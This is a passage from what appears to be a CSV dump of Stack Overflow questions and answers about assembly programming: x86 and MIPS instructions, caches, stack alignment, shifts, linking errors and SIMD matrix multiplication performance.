  <blockquote class=""spoiler"">
    <p> It prints the result BACKWARDS!<br>
 To fix this, we'll have to redesign how the digits are obtained
 and stored before printing.</p>
  </blockquote>
</blockquote>

<p>I'm emailing this directly to you, along with some additional notes.</p>
","11282330"
"What is meant by data cache and instruction cache?","17158","","<p>From <a href=""http://www.cs.umd.edu/class/sum2003/cmsc311/Notes/Memory/introCache.html"">here</a>:</p>

<blockquote>
  <p>Instructions and data have different access patterns, and access
  different regions of memory. Thus, having the same cache for both
  instructions and data may not always work out.</p>
  
  <p>Thus, it's rather common to have two caches: an instruction cache that
  only stores instructions, and a data cache that only stores data.</p>
</blockquote>

<p>It's intuitive to know the distinction between instructions and data, but now I'm not show sure of the difference in this context? What constitutes as data and gets put into a data cache and what constitutes as instructions and gets put into an instruction cache?</p>

<p>I know ARM assembly. Would anything requiring <code>STR</code>, <code>LDR</code>, <code>LDMF</code> or <code>STMFD</code> use the data cache? But technically speaking <code>STR</code>, <code>LDR</code>, <code>LDMF</code> and <code>STMFD</code> are all instructions so I this is why I'm confused. Must ""data"" always exist with an ""instruction""? Is data considered anything in the <code>.data</code> section? </p>

<p>For example <code>LDR R1, =myVar</code> then would LDR go into the instruction cache and the contents of myVar go into the data cache? Or does it not work like that?</p>

<blockquote>
  <p>Instructions and data have different access patterns
  Could someone please elaborate?</p>
</blockquote>

<p>This comment I made on a helpful post highlights my difficulty understanding:</p>

<blockquote>
  <p>""The idea is that if an instruction has been loaded from memory, it's
  likely to be used again soon"" but the only way to know the next
  instruction is to read it. That means a memory read (you can't say
  it's already in cache because a new instruction is being red). So I
  still don't see the point? Say a LDR instruction just happened, so now
  LDR is in the data cache. Maybe another LDR instruction will happen,
  maybe it won't, we can't be sure so we have to actually read the next
  instruction - thus defeating the purpose of cache.</p>
</blockquote>
","<p>Instruction fetches can be done in chunks with the assumption that much of the time you are going to run through many instructions in a row.  so instruction fetches can be more efficient, there is likely a handful or more clocks of overhead per transaction then the delay for the memory to have the data ready then a clock per width of the bus for the size of the transaction.  8 words or instructions might be say 5+n+8 clocks for example, that is more efficient than one instruction at a time (5+1+1)*8.  </p>

<p>Data on the other hand it is not that good of an assumption that data will be read sequentially much of the time so additional cycles can hurt, only fetch the data asked for (u p to the width of the memory or bus as that is a freebie).  </p>

<p>On the ARMs I know about the L1 cache I and D are separate, L2 they are combined.  L1 is not on the axi/amba bus and is likely more efficient of an access than the L2 and beyond which are amba/axi (a few cycles of overhead plus time plus one clock per bus width of data for every transaction).  </p>

<p>For address spaces that are marked as cacheable (if the mmu is on) the L1 and as a result L2 will fetch a cache line instead of the individual item for data and perhaps more than a fetch amount of I data for an instruction fetch.</p>

<p>Each of your ldr and ldm instruction are going to result in data cycles that can if the address is cacheable go into the L2 and L1 caches if not already there.  the instruction itself also if at a cacheable address will go into the L2 and L1 caches if not already there.  (yes there are lots of knobs to control what is cacheable and not, dont want to get into those nuances, just assume for sake of the discussion all of these instruction fetches and data accesses are cacheable).</p>

<p>You would want to save instructions just executed in the cache in case you have a loop or run that code again.  Also the instructions that follow in the cache line will benefit from the saved overhead of the more efficient access.  but if you only execute through a small percentage of the cache line then overall those cycles are a waste, and if that happens too much then the cache made things slower.</p>

<p>Once something is in a cache then the next time it is read (or written depending on the settings) the cache copy is the one that is used, not the copy in slow memory.  Eventually  (depending on settings) if the cache copy of some item has been modified due to a write (str, stm) and some new access needs to be saved in the cache then an old one is evicted back to slow memory and a write from the cache to slow memory happens.  You dont have this problem with instructions, instructions are basically read-only so you dont have to write them back to slow memory, in theory the cache copy and the slow memory copy are the same.</p>

<pre><code>ldr r1,=myvar
</code></pre>

<p>will result in a pc relative load</p>

<pre><code>ldr r1,something
...
something: .word myvar
</code></pre>

<p>the ldr instruction will be part of a cache line fetch, an instruction fetch (along with a bunch more instructions).  these will be saved in I part of the L1 cache on an arm and the shared part of L2 (if enabled, etc).  When that instruction is finally executed then the address for something will experience a data read, which if caching is enabled in that area for that read then it will also go into the L2 and L1 cache (D part) if not already there.
If you loop around and run that instruction again right away then ideally the instruction will be in the L1 cache and the access time to fetch it is very fast a handful of clocks total.  The data also will be in the L1 cache and will also be a handful of clocks to read.</p>

<p>The 5+n+8 I mentioned above, some number of clocks of overhead (5 is just a possibility, it can vary both by the design and by what else is going on in parallel).  the N depends on the slower memory speeds.  that n is quite large for dram, so the caches l2 and L1 are much much faster, and that is why the cache is there at all to reduce the large number of clock cycles for every dram access, efficient or not.</p>
","22395752"
"Print integer to console in x86 assembly","17111","","<p>When I add two values in 16 bit assembly, what is the best way to print the result to console?</p>

<p>At the moment I have this code:</p>

<pre><code>;;---CODE START---;;
mov ax, 1   ;put 1 into ax
add ax, 2   ; add 2 to ax current value
mov ah,2  ; 2 is the function number of output char in the DOS Services.
mov dl, ax ; DL takes the value.
int 21h    ; calls DOS Services

mov ah,4Ch   ; 4Ch is the function number for exit program in DOS Services.
int 21h      ; function 4Ch doesn't care about anything in the registers.
;;---CODE END---;;
</code></pre>

<p>I think that dl value should be in ASCII code, but I'm not sure how to convert ax value after addition into ASCII.</p>
","<p>You basically want to divide by 10, print the remainder (one digit), and then repeat with the quotient.</p>

<pre><code>    ; assume number is in eax
    mov ecx, 10

loophere:
    mov edx, 0
    div ecx

    ; now eax &lt;-- eax/10
    ;     edx &lt;-- eax % 10

    ; print edx
    ; this is one digit, which we have to convert to ASCII
    ; the print routine uses edx and eax, so let's push eax
    ; onto the stack. we clear edx at the beginning of the
    ; loop anyway, so we don't care if we much around with it

    push eax

    ; convert dl to ascii
    add dl, '0'

    mov ah,2  ; 2 is the function number of output char in the DOS Services.
    int 21h    ; calls DOS Services

    ; now restore eax
    pop eax

    ; if eax is zero, we can quit

    cmp eax, 0
    jnz loophere
</code></pre>

<hr>

<p>As a side note, you have a bug in your code right here:</p>

<pre><code>mov ax, 1   ;put 1 into ax
add ax, 2   ; add 2 to ax current value
mov ah,2  ; 2 is the function number of output char in the DOS Services.
mov dl, ax ; DL takes the value.
</code></pre>

<p>You put <code>2</code> in <code>ah</code>, and then you put <code>ax</code> in <code>dl</code>.  You're basically junking <code>ax</code> before printing it.</p>

<p>You also have a size mismatch since <code>dl</code> is 8 bits wide and <code>ax</code> is 16 bits wide.</p>

<p>What you should do is flip the last two lines and fix the size mismatch:</p>

<pre><code>mov ax, 1   ;put 1 into ax
add ax, 2   ; add 2 to ax current value

mov dl, al ; DL takes the value.
mov ah,2  ; 2 is the function number of output char in the DOS Services.
</code></pre>
","4245711"
"MIPS load word syntax","17094","","<p>If I want to load a value from a memory which base address is at $a0 and off set $t2, why can't I do the following:</p>

<pre><code>lw  $s2, $a1($t2)
</code></pre>

<p>so what is the equivalent of the expression above?</p>
","<p>You can't do that because there's no MIPS instruction encoding that supports such a thing.  You need to do the addition yourself:</p>

<pre><code>add $a2, $a1, $t2
lw  $s2, 0($a2) 
</code></pre>

<p>The <code>lw</code> instruction encoding looks like this:</p>

<pre><code>1000 11ss ssst tttt iiii iiii iiii iiii
</code></pre>

<p>Where <code>sssss</code> is the source register number, <code>ttttt</code> is the destination register number, and <code>iiiiiiiiiiiiiiii</code> is the immediate.  There's no room in that encoding (and no alternate instruction encodings) that use two registers to generate the memory address.  The specific machine instruction that would get encoded from the example above is:</p>

<pre><code>1000 1100 1101 0010 0000 0000 0000 0000
</code></pre>

<p>Since the immediate is <code>0</code>, <code>$s2</code> is register <code>18</code> and <code>$a2</code> is register <code>6</code>.</p>
","2314968"
"What is the size of each asm instruction?","17020","","<p>What is the size of each asm instruction? Every instruction takes how many bytes? 8 bytes? Four for the opcode and Four for the argument? What happens when you have one opcode and 2 arguments, in mov, for example? Do they have a fixed size in memory or do they vary? Does EIP have anything to do with this, of its value is always incremented by one, being totally independent of what kind of instruction it is passing by?</p>

<p>I ask this as when I was reading <a href=""http://en.wikibooks.org/wiki/X86_Disassembly/Functions_and_Stack_Frames"" rel=""noreferrer"">http://en.wikibooks.org/wiki/X86_Disassembly/Functions_and_Stack_Frames</a> , I stumbled across the fact that it seems a call instruction is equivalent to a push and jmp instruction.</p>

<pre><code>call MYFUNCTION
mov my_var, eax
</code></pre>

<p>being the same as</p>

<pre><code>push [eip + 2];
jmp MYFUNCTION;
mov my_var, eax
</code></pre>

<p>When we're pushing [eip + 2] on the stack, to what value are we pointing then? To the line right next to ""jmp MYFUNCTION"", mov my_var eax, right?</p>

<p>ps: MSVC++ flags an error on the first line, as it says eip is undefined. It works for eax, esp, ebp, etc. What am I doing wrong?</p>
","<p>The size of a machine instruction depends on the processor architecture - there are architectures with fixed size instruction, but you are obviously refering to the IA-32 and Intel 64 and they have strongly varing instruction lengths. The instruction pointer is of course always incremented by the length of the processed instruction.</p>

<p>You can download the <a href=""http://www.intel.com/products/processor/manuals/"" rel=""noreferrer"">IA-32 and Intel 64 manuals</a> from Intel - they contain almost everything you can know about the architecture. You can find an opcode map and instruction set format in
<a href=""http://www.intel.com/products/processor/manuals/"" rel=""noreferrer"">Intel® 64 and IA-32 Architectures Software Developer’s Manual Volume 2B: Instruction Set Reference, N-Z</a> on pages 623 to 768.</p>
","1399904"
"Efficient 4x4 matrix multiplication (C vs assembly)","16951","","<p>I'm looking for a faster and trickier way to multiply two 4x4 matrices in C. My current research is focused on x86-64 assembly with SIMD extensions. So far, I've created a function witch is about 6x faster than a naive C implementation, which has exceeded my expectations for the performance improvement. Unfortunately, this stays true only when no optimization flags are used for compilation (GCC 4.7). With <code>-O2</code>, C becomes faster and my effort becomes meaningless.</p>

<p>I know that modern compilers make use of complex optimization techniques to achieve an almost perfect code, usually faster than an ingenious piece of hand-crafed assembly. But in a minority of performance-critical cases, a human may try to fight for clock cycles with the compiler. Especially, when some mathematics backed with a modern ISA can be explored (as it is in my case).</p>

<p>My function looks as follows (AT&amp;T syntax, GNU Assembler):</p>

<pre><code>    .text
    .globl matrixMultiplyASM
    .type matrixMultiplyASM, @function
matrixMultiplyASM:
    movaps   (%rdi), %xmm0    # fetch the first matrix (use four registers)
    movaps 16(%rdi), %xmm1
    movaps 32(%rdi), %xmm2
    movaps 48(%rdi), %xmm3
    xorq %rcx, %rcx           # reset (forward) loop iterator
.ROW:
    movss (%rsi), %xmm4       # Compute four values (one row) in parallel:
    shufps $0x0, %xmm4, %xmm4 # 4x 4FP mul's, 3x 4FP add's 6x mov's per row,
    mulps %xmm0, %xmm4        # expressed in four sequences of 5 instructions,
    movaps %xmm4, %xmm5       # executed 4 times for 1 matrix multiplication.
    addq $0x4, %rsi

    movss (%rsi), %xmm4       # movss + shufps comprise _mm_set1_ps intrinsic
    shufps $0x0, %xmm4, %xmm4 #
    mulps %xmm1, %xmm4
    addps %xmm4, %xmm5
    addq $0x4, %rsi           # manual pointer arithmetic simplifies addressing

    movss (%rsi), %xmm4
    shufps $0x0, %xmm4, %xmm4
    mulps %xmm2, %xmm4        # actual computation happens here
    addps %xmm4, %xmm5        #
    addq $0x4, %rsi

    movss (%rsi), %xmm4       # one mulps operand fetched per sequence
    shufps $0x0, %xmm4, %xmm4 #  |
    mulps %xmm3, %xmm4        # the other is already waiting in %xmm[0-3]
    addps %xmm4, %xmm5
    addq $0x4, %rsi           # 5 preceding comments stride among the 4 blocks

    movaps %xmm5, (%rdx,%rcx) # store the resulting row, actually, a column
    addq $0x10, %rcx          # (matrices are stored in column-major order)
    cmpq $0x40, %rcx
    jne .ROW
    ret
.size matrixMultiplyASM, .-matrixMultiplyASM
</code></pre>

<p>It calculates a whole column of the resultant matrix per iteration, by processing four floats packed in 128-bit SSE registers. The full vectorisation is possible with a bit of math (operation reordering and aggregation) and <code>mullps</code>/<code>addps</code> instructions for parallel multiplication/addition of 4xfloat packages. The code reuses registers meant for passing parameters (<code>%rdi</code>, <code>%rsi</code>, <code>%rdx</code> : GNU/Linux ABI), benefits from (inner) loop unrolling and holds one matrix entirely in XMM registers to reduce memory reads. A you can see, I have researched the topic and took my time to implement it the best I can.</p>

<p>The naive C calculation conquering my code looks like this:</p>

<pre><code>void matrixMultiplyNormal(mat4_t *mat_a, mat4_t *mat_b, mat4_t *mat_r) {
    for (unsigned int i = 0; i &lt; 16; i += 4)
        for (unsigned int j = 0; j &lt; 4; ++j)
            mat_r-&gt;m[i + j] = (mat_b-&gt;m[i + 0] * mat_a-&gt;m[j +  0])
                            + (mat_b-&gt;m[i + 1] * mat_a-&gt;m[j +  4])
                            + (mat_b-&gt;m[i + 2] * mat_a-&gt;m[j +  8])
                            + (mat_b-&gt;m[i + 3] * mat_a-&gt;m[j + 12]);
}
</code></pre>

<p>I have investigated the optimised assembly output of the above's C code which, while storing floats in XMM registers, <em>does not involve any parallel operations</em> – just scalar calculations, pointer arithmetic and conditional jumps. The compiler's code seems to be less deliberate, but it is still slightly more effective than my vectorised version expected to be about 4x faster. I'm sure that the general idea is correct – programmers do similar things with rewarding results. But what is wrong here? Are there any register allocation or instruction scheduling issues I am not aware of? Do you know any x86-64 assembly tools or tricks to support my battle against the machine?</p>
","<p>There is a way to accelerate the code and outplay the compiler. It does not involve any sophisticated pipeline analysis or deep code micro-optimisation (which doesn't mean that it couldn't further benefit from these). The optimisation uses three simple tricks:</p>

<ol>
<li><p>The function is now 32-byte aligned (which significantly boosted performance), </p></li>
<li><p>Main loop goes inversely, which reduces comparison to a zero test (based on EFLAGS),</p></li>
<li><p>Instruction-level address arithmetic proved to be faster than the ""external"" pointer calculation (even though it requires twice as much additions «in 3/4 cases»). It shortened the loop body by four instructions and reduced data dependencies within its execution path. <a href=""https://stackoverflow.com/questions/18552677/how-does-address-operand-affect-performance-and-size-of-machine-code"">See related question</a>.</p></li>
</ol>

<p>Additionally, the code uses a relative jump syntax which suppresses symbol redefinition error, which occurs when GCC tries to inline it (after being placed within <code>asm</code> statement and compiled with <code>-O3</code>).</p>

<pre><code>    .text
    .align 32                           # 1. function entry alignment
    .globl matrixMultiplyASM            #    (for a faster call)
    .type matrixMultiplyASM, @function
matrixMultiplyASM:
    movaps   (%rdi), %xmm0
    movaps 16(%rdi), %xmm1
    movaps 32(%rdi), %xmm2
    movaps 48(%rdi), %xmm3
    movq $48, %rcx                      # 2. loop reversal
1:                                      #    (for simpler exit condition)
    movss (%rsi, %rcx), %xmm4           # 3. extended address operands
    shufps $0, %xmm4, %xmm4             #    (faster than pointer calculation)
    mulps %xmm0, %xmm4
    movaps %xmm4, %xmm5
    movss 4(%rsi, %rcx), %xmm4
    shufps $0, %xmm4, %xmm4
    mulps %xmm1, %xmm4
    addps %xmm4, %xmm5
    movss 8(%rsi, %rcx), %xmm4
    shufps $0, %xmm4, %xmm4
    mulps %xmm2, %xmm4
    addps %xmm4, %xmm5
    movss 12(%rsi, %rcx), %xmm4
    shufps $0, %xmm4, %xmm4
    mulps %xmm3, %xmm4
    addps %xmm4, %xmm5
    movaps %xmm5, (%rdx, %rcx)
    subq $16, %rcx                      # one 'sub' (vs 'add' &amp; 'cmp')
    jge 1b                              # SF=OF, idiom: jump if positive
    ret
</code></pre>

<p>This is the fastest x86-64 implementation I have seen so far. I will appreciate, vote up and accept any answer providing a faster piece of assembly for that purpose!</p>
","18816857"
"how convert two bytes into one 16-bit number?","16879","","<p>I understand that 1 byte will hold a number from 0-255. And that a 16-bit number is between 0-65535.</p>

<p>If I'm trying to represent a 16-bit number using two separate 8-bit registers...how do I do that? How does the math work?</p>

<p>Thanks!</p>
","<p>The math works out as follows:</p>

<pre><code>sixteenBitNumber = 256*upperByte + lowerByte;
</code></pre>

<p>with shifts and bitwise operations:</p>

<pre><code>sixteenBitNumber = (upperByte&lt;&lt;8) | lowerByte;
</code></pre>

<p>In most CPUs, even some archaic 8-bit ones, this interpretation is done in hardware: you load bytes into parts of a 16-bit register or into separate 8-bit registers that can work as a 16-bit pair, and the hardware works with the data as if it were a single 16-bit number.</p>
","10854615"
"What does it mean to align the stack?","16783","","<p>I have been a high-level coder, and architectures are pretty new to me, so I decided to read the tutorial on Assembly here: </p>

<p><a href=""http://en.wikibooks.org/wiki/X86_Assembly/Print_Version"" rel=""noreferrer"">http://en.wikibooks.org/wiki/X86_Assembly/Print_Version</a></p>

<p>Far down the tutorial, instructions on how to convert the Hello World! program </p>

<pre><code>#include &lt;stdio.h&gt;

int main(void) {
    printf(""Hello, world!\n"");
    return 0;
}
</code></pre>

<p>into equivalent assembly code was given and the following was generated:</p>

<pre><code>        .text
LC0:
        .ascii ""Hello, world!\12\0""
.globl _main
_main:
        pushl   %ebp
        movl    %esp, %ebp
        subl    $8, %esp
        andl    $-16, %esp
        movl    $0, %eax
        movl    %eax, -4(%ebp)
        movl    -4(%ebp), %eax
        call    __alloca
        call    ___main
        movl    $LC0, (%esp)
        call    _printf
        movl    $0, %eax
        leave
        ret
</code></pre>

<p>For one of the lines,</p>

<pre><code>andl    $-16, %esp
</code></pre>

<p>the explanation was:</p>

<blockquote>
  <p>This code ""and""s ESP with 0xFFFFFFF0,
  aligning the stack with the next
  lowest 16-byte boundary. An
  examination of Mingw's source code
  reveals that this may be for SIMD
  instructions appearing in the ""_main""
  routine, which operate only on aligned
  addresses. Since our routine doesn't
  contain SIMD instructions, this line
  is unnecessary.</p>
</blockquote>

<p>I do not understand this point. Can someone give me an explanation of what it means to align the stack with the next 16-byte boundary and why it is required? And how is the <code>andl</code> achieving this?</p>
","<p>Assume the stack looks like this on entry to <code>_main</code> (the address of the stack pointer is just an example):</p>

<pre><code>|    existing     |
|  stack content  |
+-----------------+  &lt;--- 0xbfff1230
</code></pre>

<p>Push <code>%ebp</code>, and subtract 8 from <code>%esp</code> to reserve some space for local variables:</p>

<pre><code>|    existing     |
|  stack content  |
+-----------------+  &lt;--- 0xbfff1230
|      %ebp       |
+-----------------+  &lt;--- 0xbfff122c
:    reserved     :
:     space       :
+-----------------+  &lt;--- 0xbfff1224
</code></pre>

<p>Now, the <code>andl</code> instruction zeroes the low 4 bits of <code>%esp</code>, which <em>may</em> decrease it; in this particular example, it has the effect of reserving an additional 4 bytes:</p>

<pre><code>|    existing     |
|  stack content  |
+-----------------+  &lt;--- 0xbfff1230
|      %ebp       |
+-----------------+  &lt;--- 0xbfff122c
:    reserved     :
:     space       :
+ - - - - - - - - +  &lt;--- 0xbfff1224
:   extra space   :
+-----------------+  &lt;--- 0xbfff1220
</code></pre>

<p>The point of this is that there are some ""SIMD"" (Single Instruction, Multiple Data) instructions (also known in x86-land as ""SSE"" for ""Streaming SIMD Extensions"") which can perform parallel operations on multiple words in memory, but require those multiple words to be a block starting at an address which is a multiple of 16 bytes.</p>

<p>In general, the compiler can't assume that particular offsets from <code>%esp</code> will result in a suitable address (because the state of <code>%esp</code> on entry to the function depends on the calling code).  But, by deliberately aligning the stack pointer in this way, the compiler knows that adding any multiple of 16 bytes to the stack pointer will result in a 16-byte aligned address, which is safe for use with these SIMD instructions.</p>
","4175400"
"sra(shift right arithmetic) vs srl (shift right logical)","16745","","<p>Please  take a look at these two pieces of pseudo-assembly code:</p>

<p>1)</p>

<pre><code>li $t0,53

sll $t1,$t0,2
srl $t2,$t0,2
sra $t3,$t0,2

print $t1  
print $t2  
print $t3  
</code></pre>

<p>2)</p>

<pre><code>li $t0,-53


sll $t1,$t0,2
srl $t2,$t0,2
sra $t3,$t0,2

print $t1
print $t2
print $t3
</code></pre>

<p>in the first case the output is:<br>
212<br>
13<br>
13</p>

<p>in the latter is:<br>
-212<br>
107374...<br>
-14<br>
But shouldn't : sra (-53) = - (srl 53) ?</p>
","<pre><code>-53 = 1111111111001011

           sra 2

      1111111111110010(11) = -14
       ^^              ^^
      sign           dropped
    extension
</code></pre>

<p>Because the extra bits are simply dropped for both positive and negative results, the result is always rounded down if you view the shift as a division.</p>

<pre><code> 53 sra 2 = floor( 53 / 2^2) = floor( 13.25) =  13
-53 sra 2 = floor(-53 / 2^2) = floor(-13.25) = -14
</code></pre>
","6269556"
"Printing a string and variable in MIPS","16696","","<p>Here's the C representation of what I'm trying to do in MIPS assembly:</p>

<pre><code>printf (""x=%d\n"", x);
</code></pre>

<p>I know that I can do a syscall to easily print x=  and I can also do a syscall to print the int x (which is stored in a register).  However, that prints them like this (let's say x is 5):</p>

<blockquote>
  <p>x=</p>
  
  <p>5</p>
</blockquote>

<p>How can I make them print on the same line?</p>
","<p>Look at the Fibonacci.asm example: <a href=""http://courses.missouristate.edu/KenVollmar/MARS/Fibonacci.asm"" rel=""nofollow noreferrer"">http://courses.missouristate.edu/KenVollmar/MARS/Fibonacci.asm</a> - it seems to be a good example of exactly what you need to do - look at the part near the <code>print:</code> label. It looks like you needs <code>syscall 4</code> for printing the <code>x =</code> part and <code>syscall 1</code> for printing the integer itself.</p>
","2692128"
"LOOP, LOOPE, LOOPNE?","16643","","<p>What's the difference between the assembly instructions <code>LOOP</code>, <code>LOOPE</code> and <code>LOOPNE</code>?</p>
","<p>LOOP decrements ecx and checks if ecx is not zero, if that condition is met it jumps at specified label, otherwise falls through.</p>

<p>LOOPE decrements ecx and checks that ecx is not zero <em>and</em> ZF is set - if these conditions are met, it jumps at label, otherwise falls through.</p>

<p>LOOPNE is same as LOOPE except that it requires ZF to be not set (i.e be zero) to do the jump.</p>
","1756322"
"undefined reference to `printf'","16552","","<p><em><strong>test.c</em></strong> and <strong><em>kernel.asm</em></strong> are in the folder <strong><em>src</em></strong>, <strong><em>Makefile</em></strong> is in the folder <strong><em>Debug</em></strong>, just like that:</p>

<pre><code>src
    test.c
    kernel.asm
Debug
    Makefile
</code></pre>

<p>All these files are very simple codes. But if I run <code>make</code> in the folder <code>Debug</code>,I will get the following error:</p>

<pre><code>ld -Ttext 0x30400 -o test ../Debug/kernel.o ../Debug/test.o
../Debug/test.o: In function `Print_String':
test.c:(.text+0xf): undefined reference to `printf'
</code></pre>

<p>Can someone tell me why? Contents are as follows:</p>

<p><em><strong>test.c</em></strong></p>

<pre><code>#include &lt;stdio.h&gt;

int m = 1;
void Print_String()
{
    printf(""TEST"");
}
</code></pre>

<p><em><strong>kernel.asm</em></strong></p>

<pre><code>extern m
extern Print_String

[section .text]
global _start
_start:
    mov eax, m
    call Print_String
</code></pre>

<p><em><strong>Makefile</em></strong></p>

<pre><code># This Program
TARGET  = test

# All Phony Targets
.PHONY : everything clean all

DIR     = ..

OBJ     = $(DIR)/Debug/kernel.o $(DIR)/Debug/test.o
C_FILE  = $(DIR)/src/test.c
K_ASM   = $(DIR)/src/kernel.asm

ASM     = nasm
LD      = ld
CC      = gcc

CC_FLAG  = -c -g
ASM_FLAG = -f elf
LD_FLAG  = -Ttext 0x30400

# Default starting position
everything : $(TARGET)

clean :
    rm -f $(TARGET)

all : clean everything

kernel.o : $(K_ASM)
    $(ASM) $(ASM_FLAG) -o $@ $&lt;

test     : $(OBJ)
    $(LD) $(LD_FLAG) -o $@ $(OBJ)

test.o   : $(C_FILE)
    $(CC) $(CC_FLAG) -o $@ $&lt;
</code></pre>
","<p>Unless you have your own version of <code>printf</code> somewhere, you'll have to link with the C runtime library.</p>

<p>Pass the option  <code>-lc</code> to the <code>ld</code> command. </p>
","23644312"
"Error LNK1181: cannot open input file when compiling as .LIB","16549","","<p>I got a library here which uses the Intel Composer XE 2013 and I would like to compile it as a .lib as I am going to use it with another project (It is compiling as application/EXE by default). However, when I set the Configuration Type under Project Defaults under the Configuration Manager in Visual Studio 2012, I get "" error LNK1181: cannot open input file"" Odd part is that the file it looks for has no file ending. The project contains both C, C++ and ASM code. Does anyone got any experience with this kind of behavior?</p>
","<p>I solved the issue by renaming the .obj files without their file extension. For example, it was looking for file name ""foo"", I had ""foo.obj"" so I renamed ""foo.obj"" to ""foo"".</p>
","17639661"
"How to convert ASM to read-able code?","16543","","<p>I have an exe which I have opened with PE Explorer Disassembler. Now I can see the asm code, which looks like that:</p>

<pre><code>    push    ebx
    push    esi
    mov ebx,eax
    mov eax,[ebx+38h]
    push    eax
    mov eax,[ebx+3Ch]
    push    eax
    mov ecx,edx
    mov eax,ebx
    mov edx,[ebx+30h]
    mov esi,[eax]
    call    [esi+7Ch]
    or  byte ptr [ebx+00000088h],02h
    pop esi
    pop ebx
    retn
</code></pre>

<p>I have no idea what that means. Is there a way to convert this now into read-able code (C, C++, C# or VB.NET)?</p>

<p>Background info: The reason why I need this is because I need to call the above function from my windows app. Now this function resides in the third party exe - there is no API or source-code for it. Any help or advice is appreciated. </p>
","<p>What you want is called ""decompilation"".</p>

<p>That is not easy to solve task, and often not possible at all. You might try <a href=""https://www.google.com/search?q=x86+decompiler"" rel=""nofollow noreferrer"">Google</a> as a start.</p>
","3637200"
"How can I multiply two 64-bit numbers using x86 assembly language?","16533","","<p>How would I go about...</p>

<ul>
<li><p>multiplying two 64-bit numbers </p></li>
<li><p>multiplying two 16-digit hexadecimal numbers </p></li>
</ul>

<p>...using Assembly Language. </p>

<p>I'm only allowed to use registers %eax, %ebx, %ecx, %edx, and the stack.</p>

<p>EDIT: Oh, I'm using ATT Syntax on the x86<br>
EDIT2: Not allowed to decompile into assembly...</p>
","<p>Use what should probably be your course textbook, Randall Hyde's ""The Art of Assembly Language"".</p>

<p>See <a href=""http://www.plantation-productions.com/Webster/www.artofasm.com/Windows/HTML/AdvancedArithmetica2.html#1007619"" rel=""noreferrer"">4.2.4 - Extended Precision Multiplication</a></p>

<blockquote>
  <p>Although an 8x8, 16x16, or 32x32 multiply is usually sufficient, there are times when you may want to multiply larger values together. You will use the x86 single operand MUL and IMUL instructions for extended precision multiplication ..</p>
  
  <p>Probably the most important thing to remember <em>when performing an extended precision multiplication is that you must also perform a multiple precision addition at the same time</em>. Adding up all the partial products requires several additions that will produce the result. The following listing demonstrates the proper way to multiply two 64 bit values on a 32 bit processor ..</p>
</blockquote>

<p>(See the link for full assembly listing and illustrations.)</p>
","87842"
"Difference in performance between MSVC and GCC for highly optimized matrix multplication code","16503","","<p>I'm seeing a big difference in performance between code compiled in MSVC (on Windows) and GCC (on Linux) for an Ivy Bridge system.  The code does dense matrix multiplication.  I'm getting 70% of the peak flops with GCC and only 50% with MSVC.  I think I may have isolated the difference to how they both convert the following three intrinsics. </p>

<pre><code>__m256 breg0 = _mm256_loadu_ps(&amp;b[8*i])
_mm256_add_ps(_mm256_mul_ps(arge0,breg0), tmp0)
</code></pre>

<p>GCC does this</p>

<pre><code>vmovups ymm9, YMMWORD PTR [rax-256]
vmulps  ymm9, ymm0, ymm9
vaddps  ymm8, ymm8, ymm9
</code></pre>

<p>MSVC does this</p>

<pre><code>vmulps   ymm1, ymm2, YMMWORD PTR [rax-256]
vaddps   ymm3, ymm1, ymm3
</code></pre>

<p><strong>Could somebody please explain to me if and why these two solutions could give such a big difference in performance?</strong>  </p>

<p>Despite MSVC using one less instruction it ties the load to the mult and maybe that makes it more dependent (maybe the load can't be done out of order)?  I mean Ivy Bridge can do one AVX load, one AVX mult, and one AVX add in one clock cycle but this requires each operation to be independent. </p>

<p>Maybe the problem lies elsewhere?  You can see the full assembly code for GCC and MSVC for the innermost loop below.  You can see the C++ code for the loop here <a href=""https://stackoverflow.com/questions/21090873/loop-unrolling-to-achieve-maximum-throughput-with-ivy-bridge-and-haswell"">Loop unrolling to achieve maximum throughput with Ivy Bridge and Haswell</a></p>

<p>g++ -S -masm=intel matrix.cpp -O3 -mavx -fopenmp </p>

<pre><code>.L4:
    vbroadcastss    ymm0, DWORD PTR [rcx+rdx*4]
    add rdx, 1
    add rax, 256
    vmovups ymm9, YMMWORD PTR [rax-256]
    vmulps  ymm9, ymm0, ymm9
    vaddps  ymm8, ymm8, ymm9
    vmovups ymm9, YMMWORD PTR [rax-224]
    vmulps  ymm9, ymm0, ymm9
    vaddps  ymm7, ymm7, ymm9
    vmovups ymm9, YMMWORD PTR [rax-192]
    vmulps  ymm9, ymm0, ymm9
    vaddps  ymm6, ymm6, ymm9
    vmovups ymm9, YMMWORD PTR [rax-160]
    vmulps  ymm9, ymm0, ymm9
    vaddps  ymm5, ymm5, ymm9
    vmovups ymm9, YMMWORD PTR [rax-128]
    vmulps  ymm9, ymm0, ymm9
    vaddps  ymm4, ymm4, ymm9
    vmovups ymm9, YMMWORD PTR [rax-96]
    vmulps  ymm9, ymm0, ymm9
    vaddps  ymm3, ymm3, ymm9
    vmovups ymm9, YMMWORD PTR [rax-64]
    vmulps  ymm9, ymm0, ymm9
    vaddps  ymm2, ymm2, ymm9
    vmovups ymm9, YMMWORD PTR [rax-32]
    cmp esi, edx
    vmulps  ymm0, ymm0, ymm9
    vaddps  ymm1, ymm1, ymm0
    jg  .L4
</code></pre>

<p>MSVC /FAc /O2 /openmp /arch:AVX ...</p>

<pre><code>vbroadcastss ymm2, DWORD PTR [r10]    
lea  rax, QWORD PTR [rax+256]
lea  r10, QWORD PTR [r10+4] 
vmulps   ymm1, ymm2, YMMWORD PTR [rax-320]
vaddps   ymm3, ymm1, ymm3    
vmulps   ymm1, ymm2, YMMWORD PTR [rax-288]
vaddps   ymm4, ymm1, ymm4    
vmulps   ymm1, ymm2, YMMWORD PTR [rax-256]
vaddps   ymm5, ymm1, ymm5    
vmulps   ymm1, ymm2, YMMWORD PTR [rax-224]
vaddps   ymm6, ymm1, ymm6    
vmulps   ymm1, ymm2, YMMWORD PTR [rax-192]
vaddps   ymm7, ymm1, ymm7    
vmulps   ymm1, ymm2, YMMWORD PTR [rax-160]
vaddps   ymm8, ymm1, ymm8    
vmulps   ymm1, ymm2, YMMWORD PTR [rax-128]
vaddps   ymm9, ymm1, ymm9    
vmulps   ymm1, ymm2, YMMWORD PTR [rax-96]
vaddps   ymm10, ymm1, ymm10    
dec  rdx
jne  SHORT $LL3@AddDot4x4_
</code></pre>

<p><strong>EDIT:</strong></p>

